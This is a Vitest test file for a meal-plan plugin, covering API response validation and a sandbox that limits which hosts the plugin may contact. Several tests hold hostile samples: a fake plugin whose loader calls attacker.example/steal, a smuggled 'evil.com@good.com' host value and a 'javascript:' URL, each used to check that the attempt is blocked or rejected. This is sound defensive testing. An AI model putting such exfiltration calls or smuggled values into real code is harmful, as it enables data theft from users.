import { describe, expect, it, vi } from 'vitest';
import fixture from './fixtures/mealq-meal-plan.json';
import { fetchMealPlan } from '../src/plugins/mealq/client';
import plugin, { configSchema } from '../src/plugins/mealq/plugin';
import { buildRegistry } from '../src/plugins/registry';
import { loadPluginData } from '../src/plugins/host';
import { definePlugin, resolveFetchPolicy } from '../src/plugins/types';
import { z } from 'zod';
import { fakeKv } from './kvshim';

const REQ = { apiHost: 'api.mealq.example', token: 'tok', from: '2026-10-03', to: '2026-10-09' };
const ok = (body: unknown) => vi.fn(async (_u: string, _i?: RequestInit) => new Response(JSON.stringify(body)));

describe('contract fixture', () => {
  it('is accepted and normalised: one entry per day, meals ordered by slot, unknown slots kept as other', async () => {
    const plan = await fetchMealPlan(ok(fixture) as never, REQ);
    expect(plan.days.map((d) => d.date)).toEqual(['2026-10-03', '2026-10-04', '2026-10-05', '2026-10-06', '2026-10-07', '2026-10-08', '2026-10-09']);
    expect(plan.days[0]!.meals.map((m) => m.slot)).toEqual(['breakfast', 'lunch', 'dinner']);
    expect(plan.days[0]!.meals[2]).toEqual({
      id: 'm_1', slot: 'dinner', title: 'Chicken tacos', note: 'Double the salsa',
      ingredients: ['Chicken thighs', 'Tortillas', 'Salsa', 'Lime'], prepMinutes: 35, recipeUrl: 'https://recipes.example/chicken-tacos',
    });
    expect(plan.days[2]!.meals).toEqual([]); // omitted by the API, filled in
    expect(plan.days[4]!.meals).toEqual([]); // sent empty
  });
});

describe('fetchMealPlan', () => {
  it('builds the contract URL with the bearer token', async () => {
    const f = ok({ days: [] });
    await fetchMealPlan(f as never, REQ);
    const [url, init] = f.mock.calls[0]!;
    expect(url).toBe('https://api.mealq.example/v1/meal-plan?from=2026-10-03&to=2026-10-09');
    expect((init!.headers as Record<string, string>).Authorization).toBe('Bearer tok');
    expect(init!.method).toBeUndefined(); // GET
  });
  it('maps unknown slots to other, drops unknown fields, ignores out-of-range days and merges duplicate dates', async () => {
    const plan = await fetchMealPlan(ok({ days: [
      { date: '2026-10-03', meals: [{ id: 'a', slot: 'brunch', title: ' Pancakes ', secretField: 'x', memberEmail: 'a@b.c' }] },
      { date: '2026-10-03', meals: [{ id: 'b', slot: 'dinner', title: 'Soup' }] },
      { date: '2026-09-01', meals: [{ id: 'old', slot: 'dinner', title: 'Past' }] },
      { date: '2026-12-25', meals: [{ id: 'far', slot: 'dinner', title: 'Future' }] },
    ] }) as never, REQ);
    expect(plan.days[0]!.meals).toEqual([{ id: 'b', slot: 'dinner', title: 'Soup' }, { id: 'a', slot: 'other', title: 'Pancakes' }]); // dinner ranks before other
    expect(JSON.stringify(plan)).not.toMatch(/secretField|memberEmail|Past|Future/);
  });
  it.each([
    ['not an object', 'nope'],
    ['days not an array', { days: 'x' }],
    ['bad date', { days: [{ date: '10/03/2026', meals: [] }] }],
    ['empty title', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: '  ' }] }] }],
    ['oversized title', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: 'x'.repeat(201) }] }] }],
    ['non-https recipe url', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: 't', recipeUrl: 'http://x.example' }] }] }],
    ['javascript recipe url', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: 't', recipeUrl: 'javascript:alert(1)' }] }] }],
    ['too many ingredients', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: 't', ingredients: Array.from({ length: 51 }, () => 'x') }] }] }],
    ['bad prep time', { days: [{ date: '2026-10-03', meals: [{ id: 'a', slot: 'dinner', title: 't', prepMinutes: 0 }] }] }],
    ['too many meals', { days: [{ date: '2026-10-03', meals: Array.from({ length: 21 }, (_, i) => ({ id: `${i}`, slot: 'dinner', title: 't' })) }] }],
    ['too many days', { days: Array.from({ length: 32 }, (_, i) => ({ date: '2026-10-03', meals: [] , i })) }],
  ])('rejects a malformed response (%s)', async (_n, body) => {
    await expect(fetchMealPlan(ok(body) as never, REQ)).rejects.toThrow(/contract/);
  });
  it('fails with the status only, never the body', async () => {
    const f = vi.fn(async () => new Response('{"error":"token abc123 revoked"}', { status: 401 }));
    await expect(fetchMealPlan(f as never, REQ)).rejects.toThrow(/^MealQ API 401$/);
  });
  it('handles non-JSON bodies as contract failures', async () => {
    const f = vi.fn(async () => new Response('<html>oops</html>'));
    await expect(fetchMealPlan(f as never, REQ)).rejects.toThrow(/contract/);
  });
});

describe('mealq plugin', () => {
  it('requires a bare hostname and normalises case', () => {
    expect(configSchema.parse({ apiHost: ' API.MealQ.example ' }).apiHost).toBe('api.mealq.example');
    for (const bad of ['', 'localhost', 'https://api.mealq.example', 'api.mealq.example/v1', 'api.mealq.example:8443', '*.mealq.example', 'a b.example', 'evil.com@good.com', '-x.example'])
      expect(() => configSchema.parse({ apiHost: bad }), bad).toThrow();
    expect(() => configSchema.parse({})).toThrow();
  });
  it('allows exactly the configured host, GET only, and nothing else', () => {
    const policy = resolveFetchPolicy(plugin, configSchema.parse({ apiHost: 'api.mealq.example' }));
    expect(policy).toEqual({ hosts: ['api.mealq.example'] });
  });
  it('declares only its own secrets', () => {
    expect(plugin.secrets).toEqual(['MEALQ_API_TOKEN']);
  });

  const enabled = (apiHost = 'api.mealq.example') =>
    buildRegistry({ './mealq/plugin.ts': plugin }, { title: 't', plugins: [{ id: 'mealq', config: { apiHost, timeZone: 'America/New_York' } }] }).enabled[0]!;
  const kv = fakeKv;
  const env = { MEALQ_API_TOKEN: 't' };

  it('runs through the host: requests today..today+6 in the household time zone', async () => {
    const f = ok(fixture);
    const now = Date.parse('2026-10-04T02:30:00Z'); // still Oct 3 in New York
    const r = await loadPluginData(enabled(), { env, kv: kv(), now, fetchImpl: f as never });
    expect(f.mock.calls[0]![0]).toContain('from=2026-10-03&to=2026-10-09');
    expect(r).toMatchObject({ status: 'ok', data: { from: '2026-10-03', to: '2026-10-09' } });
  });
  it('is unconfigured without its secrets, and the loader never runs', async () => {
    const f = ok(fixture);
    expect(await loadPluginData(enabled(), { env: {}, kv: kv(), fetchImpl: f as never })).toEqual({ status: 'unconfigured', missing: ['MEALQ_API_TOKEN'] });
    expect(f).not.toHaveBeenCalled();
  });
  it('is blocked from contacting any host other than the configured one', async () => {
    const evil = definePlugin({
      id: 'mealq', name: 'x', icon: 'x', configSchema: z.object({ apiHost: z.string() }), secrets: [], cacheTtlSeconds: 1,
      fetchPolicy: (c) => ({ hosts: [c.apiHost] }),
      loader: async ({ fetch }) => { await fetch('https://attacker.example/steal'); return 1; },
    });
    const base = vi.fn(async () => new Response('x'));
    const e = buildRegistry({ './mealq/plugin.ts': evil }, { title: 't', plugins: [{ id: 'mealq', config: { apiHost: 'api.mealq.example' } }] }).enabled[0]!;
    expect(await loadPluginData(e, { env: {}, kv: kv(), fetchImpl: base as never })).toEqual({ status: 'error' });
    expect(base).not.toHaveBeenCalled();
  });
  it('rejects a config-derived policy that is not exact hostnames at startup', () => {
    const sneaky = definePlugin({ id: 'mealq', name: 'x', icon: 'x', configSchema: z.object({}), secrets: [], cacheTtlSeconds: 1, fetchPolicy: () => ({ hosts: ['*.example.com'] }), loader: async () => 1 });
    expect(() => buildRegistry({ './mealq/plugin.ts': sneaky }, { title: 't', plugins: [{ id: 'mealq' }] })).toThrow(/exact hostnames/);
  });
});
